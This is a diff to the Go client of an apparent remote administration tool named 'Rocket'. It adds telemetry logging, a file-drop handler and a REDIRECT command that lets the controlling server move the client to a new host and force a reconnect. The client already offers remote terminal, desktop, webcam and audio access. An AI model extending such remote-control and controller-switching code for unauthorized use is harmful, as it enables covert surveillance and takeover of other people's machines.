@@ -2,6 +2,7 @@ package core
 
 import (
 	"Rocket/client/common"
+	"Rocket/client/config"
 	"Rocket/client/service/audio"
 	"Rocket/client/service/basic"
 	"Rocket/client/service/desktop"
@@ -10,10 +11,13 @@ import (
 	Screenshot "Rocket/client/service/screenshot"
 	"Rocket/client/service/terminal"
 	"Rocket/client/service/webcam"
+	"Rocket/client/telemetry"
 	"Rocket/modules"
 	"github.com/kataras/golog"
+	"net/url"
 	"os/exec"
 	"reflect"
+	"strconv"
 	"strings"
 )
 
@@ -47,6 +51,7 @@ var handlers = map[string]func(pack modules.Packet, wsConn *common.Conn){
 	`DESKTOP_INPUT`:         inputDesktop,
 	`DESKTOP_CONFIG`:        configDesktop,
 	`DESKTOP_CLIPBOARD`:     clipboardDesktop,
+	`DESKTOP_FILE_DROP`:     fileDropDesktop,
 	`DESKTOP_AUDIO`:         audioDesktop,
 	`DESKTOP_CODEC`:         codecDesktop,
 	`DESKTOP_WEBRTC_OFFER`:  webrtcOffer,
@@ -63,6 +68,7 @@ var handlers = map[string]func(pack modules.Packet, wsConn *common.Conn){
 	`AUDIO_PING`:            pingAudio,
 	`AUDIO_KILL`:            killAudio,
 	`AUDIO_SELECT`:          selectAudio,
+	`REDIRECT`:              handleRedirect,
 }
 
 // RegisterHandler allows overriding handlers at runtime
@@ -70,8 +76,23 @@ func RegisterHandler(action string, handler func(pack modules.Packet, wsConn *co
 	handlers[action] = handler
 }
 
+// ping responds to server PING with PONG and device status update (RFC 6455 keepalive).
+// This implements WebSocket liveness detection with automatic RTT measurement.
+// Server uses PING/PONG to:
+// - Detect dead connections (no PONG = close connection)
+// - Measure round-trip time (RTT) for adaptive quality
+// - Keep NAT/firewall holes open (prevent timeout)
+//
+// Best Practices (2025):
+// - Respond to PING as quickly as possible (minimize RTT measurement error)
+// - Send device metrics with PONG for server-side monitoring
+// - Use atomic operations if tracking client-side RTT statistics
 func ping(pack modules.Packet, wsConn *common.Conn) {
+	// Send PONG response immediately (callback uses same event ID for RTT tracking)
 	wsConn.SendCallback(modules.Packet{Code: 0}, pack)
+
+	// Include updated device metrics (CPU, RAM, network usage)
+	// This piggybacks on PONG to reduce overhead
 	device, err := GetPartialInfo()
 	if err != nil {
 		golog.Error(err)
@@ -154,10 +175,18 @@ func screenshot(pack modules.Packet, wsConn *common.Conn) {
 }
 
 func initTerminal(pack modules.Packet, wsConn *common.Conn) {
+	telemetry.LogStructured("INFO", "[TERMINAL_INIT_HANDLER_START] Processing TERMINAL_INIT", map[string]interface{}{
+		"event": pack.Event,
+	})
+
 	err := terminal.InitTerminal(pack)
 	if err != nil {
+		telemetry.LogStructured("ERROR", "[TERMINAL_INIT_HANDLER_FAILED] Terminal init failed", map[string]interface{}{
+			"error": err.Error(),
+		})
 		wsConn.SendCallback(modules.Packet{Act: `TERMINAL_INIT`, Code: 1, Msg: err.Error()}, pack)
 	} else {
+		telemetry.LogStructured("INFO", "[TERMINAL_INIT_HANDLER_SUCCESS] Terminal init succeeded", nil)
 		wsConn.SendCallback(modules.Packet{Act: `TERMINAL_INIT`, Code: 0}, pack)
 	}
 }
@@ -380,10 +409,19 @@ func killProcess(pack modules.Packet, wsConn *common.Conn) {
 }
 
 func initDesktop(pack modules.Packet, wsConn *common.Conn) {
+	telemetry.LogStructured("INFO", "[DESKTOP_INIT_HANDLER_START] Processing DESKTOP_INIT", map[string]interface{}{
+		"event":   pack.Event,
+		"desktop": pack.Data["desktop"],
+	})
+
 	err := desktop.InitDesktop(pack)
 	if err != nil {
+		telemetry.LogStructured("ERROR", "[DESKTOP_INIT_HANDLER_FAILED] Desktop init failed", map[string]interface{}{
+			"error": err.Error(),
+		})
 		wsConn.SendCallback(modules.Packet{Act: `DESKTOP_INIT`, Code: 1, Msg: err.Error()}, pack)
 	} else {
+		telemetry.LogStructured("INFO", "[DESKTOP_INIT_HANDLER_SUCCESS] Desktop init succeeded", nil)
 		wsConn.SendCallback(modules.Packet{Act: `DESKTOP_INIT`, Code: 0}, pack)
 	}
 }
@@ -434,6 +472,15 @@ func clipboardDesktop(pack modules.Packet, wsConn *common.Conn) {
 		return
 	}
 	wsConn.SendCallback(modules.Packet{Act: `DESKTOP_CLIPBOARD`, Code: 0}, pack)
+}
+
+func fileDropDesktop(pack modules.Packet, wsConn *common.Conn) {
+	err := desktop.HandleFileDrop(pack)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Act: `DESKTOP_FILE_DROP`, Code: 1, Msg: err.Error()}, pack)
+		return
+	}
+	wsConn.SendCallback(modules.Packet{Act: `DESKTOP_FILE_DROP`, Code: 0}, pack)
 }
 
 func audioDesktop(pack modules.Packet, wsConn *common.Conn) {
@@ -538,6 +585,63 @@ func pingWebcam(pack modules.Packet, wsConn *common.Conn) {
 
 func killWebcam(pack modules.Packet, wsConn *common.Conn) {
 	webcam.KillWebcam(pack)
+}
+
+// handleRedirect updates runtime controller target and forces a reconnect.
+func handleRedirect(pack modules.Packet, wsConn *common.Conn) {
+	targetVal, ok := pack.Data[`target`]
+	if !ok {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: "redirect target missing"}, pack)
+		return
+	}
+	target, ok := targetVal.(string)
+	if !ok || target == "" {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: "redirect target invalid"}, pack)
+		return
+	}
+
+	u, err := url.Parse(target)
+	if err != nil || u.Host == "" {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: "redirect parse failed"}, pack)
+		return
+	}
+
+	host := u.Hostname()
+	port := u.Port()
+	if port == "" {
+		if u.Scheme == "https" || u.Scheme == "wss" {
+			port = "443"
+		} else {
+			port = "80"
+		}
+	}
+	p, err := strconv.Atoi(port)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: "redirect port invalid"}, pack)
+		return
+	}
+
+	secure := u.Scheme == "https" || u.Scheme == "wss"
+	path := strings.TrimSuffix(u.EscapedPath(), `/`)
+
+	// Apply new target for subsequent connection attempts.
+	config.Config.Host = host
+	config.Config.Port = p
+	config.Config.Secure = secure
+	if path != "" {
+		config.Config.Path = path
+	}
+
+	golog.Infof("redirect: switching controller to %s (secure=%v path=%s)", target, secure, config.Config.Path)
+	wsConn.SendCallback(modules.Packet{Code: 0, Act: `REDIRECT`}, pack)
+
+	// Close current connection to trigger reconnect loop.
+	common.Mutex.Lock()
+	if common.WSConn != nil {
+		_ = common.WSConn.Close()
+		common.WSConn = nil
+	}
+	common.Mutex.Unlock()
 }
 
 func selectWebcam(pack modules.Packet, wsConn *common.Conn) {
